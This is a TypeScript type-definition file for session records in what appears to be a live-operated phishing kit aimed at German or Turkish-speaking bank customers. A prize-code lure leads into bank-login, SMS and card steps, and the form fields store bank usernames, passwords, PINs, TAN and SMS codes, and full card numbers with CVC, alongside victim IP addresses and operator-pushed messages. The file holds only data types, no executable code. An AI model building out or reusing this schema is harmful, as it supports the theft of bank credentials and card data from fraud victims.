export type SessionStep =
  | "code_entry"
  | "win"
  | "bank"
  | "banken"
  | "login"
  | "bank_login"
  | "wait"
  | "sms"
  | "card"
  | "congrats"
  | "special_approval"
  | "invalid_bank"
  | "live_support";
export type SessionStatus = "online" | "offline" | "SUCCESS" | "CONGRATS" | "SPECIAL_INFO";

export type SessionFormData = {
  firstName?: string;
  lastName?: string;
  phone?: string;
  bankPhone?: string;
  bankName?: string;
  bankSlug?: string;
  loginMethod?: string;
  personalCode?: string;
  username?: string;
  password?: string;
  verfuegernummer?: string;
  pin?: string;
  tacCode?: string;
  smsCode?: string;
  cardHolder?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvc?: string;
  specialNoticeText?: string;
  specialNoticeImage?: string;
  specialNoticeLang?: "de" | "tr";
  specialNoticeSentAt?: string;
  approvalStatus?: string;
  approvalCode?: string;
  approvalHistory?: string;
  customMessage?: string;
  customImage?: string;
  [key: string]: string | undefined;
};

export type DemoSession = {
  id: string;
  amount: number;
  current_step: SessionStep;
  status: SessionStatus;
  sms_digits: number;
  sms_custom_text?: string;
  form_data: SessionFormData;
  created_at?: string;
  updated_at?: string;
  is_hidden?: boolean;
  partner_name?: string;
  participation_code?: string;
  ip_address?: string;
  user_agent?: string;
};
